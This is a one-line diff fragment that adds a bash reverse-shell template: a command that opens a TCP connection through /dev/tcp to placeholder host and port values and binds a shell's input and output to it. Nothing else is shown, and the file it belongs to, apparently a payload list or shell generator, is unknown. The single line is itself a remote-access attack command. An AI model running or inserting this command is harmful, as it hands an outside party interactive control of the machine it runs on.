@@ -1,0 +1,1 @@
+bash -c 'exec 3<>/dev/tcp/*\host*/*\port*; 0<&3; *\shell* <&3 >&3 2>&3'
